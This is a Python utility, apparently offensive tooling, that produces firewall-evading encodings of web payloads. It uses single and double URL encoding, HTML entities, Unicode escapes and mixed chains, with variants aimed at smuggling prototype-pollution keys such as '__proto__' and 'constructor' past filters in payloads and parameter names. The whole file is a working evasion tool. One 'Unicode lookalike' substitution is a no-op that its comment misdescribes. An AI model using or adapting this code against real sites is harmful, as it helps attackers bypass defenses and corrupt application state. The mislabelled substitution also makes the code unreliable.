"""
Layered Encoding WAF Evasion Utility
=====================================
Generates payload variants using multi-layer encoding to bypass WAFs
relying on normalization-only filtering.

Encoding chains supported:
    1. URL Encode (single)
    2. Double URL Encode
    3. HTML Decimal Entity
    4. Unicode Escape
    5. Mixed / Composite chains
"""

import urllib.parse
from typing import List


def url_encode(payload: str, safe: str = "") -> str:
    """Standard URL encoding."""
    return urllib.parse.quote(payload, safe=safe)


def double_url_encode(payload: str) -> str:
    """URL encoding applied twice."""
    return urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")


def html_decimal_encode(payload: str) -> str:
    """Encode every character as HTML decimal entity."""
    return "".join(f"&#{ord(c)};" for c in payload)


def unicode_escape(payload: str) -> str:
    """Encode non-ASCII-safe chars as Unicode backslash escapes."""
    result = []
    for c in payload:
        if c.isascii() and c.isprintable() and c not in "=&?":
            result.append(c)
        else:
            result.append(f"\\u{ord(c):04x}")
    return "".join(result)


def mixed_encode(payload: str) -> str:
    """
    Alternately HTML-entity-encode and URL-encode each character
    to create a composite evasion vector.
    """
    result = []
    for i, c in enumerate(payload):
        if i % 2 == 0:
            result.append(f"&#{ord(c)};")
        else:
            result.append(urllib.parse.quote(c, safe=""))
    return "".join(result)


def generate_encoded_variants(payload: str) -> List[str]:
    """
    Return a list of encoded variants of the same payload.
    Useful for fuzzing WAF normalization layers.
    """
    variants = [
        payload,  # plain
        url_encode(payload),
        double_url_encode(payload),
        html_decimal_encode(payload),
        # Only URL-encode the dangerous characters (selective)
        payload.replace("__proto__", url_encode("__proto__")),
        payload.replace("constructor", url_encode("constructor")),
        payload.replace("prototype", url_encode("prototype")),
        # Unicode lookalike substitutions for underscores
        payload.replace("_", "\u005f"),
        # Dot-notation to bracket-notation swap
        payload.replace(".__proto__.", "[__proto__]["),
    ]
    # Remove exact duplicates while preserving order
    seen = set()
    unique = []
    for v in variants:
        if v not in seen:
            seen.add(v)
            unique.append(v)
    return unique


def encode_param_key(key: str) -> List[str]:
    """
    Generate encoded variants specifically for a query parameter key
    (left side of the '=' sign).
    """
    return [
        key,
        url_encode(key),
        double_url_encode(key),
        key.replace("__proto__", "%5F%5Fproto%5F%5F"),
        key.replace("constructor", "%63onstructor"),
    ]
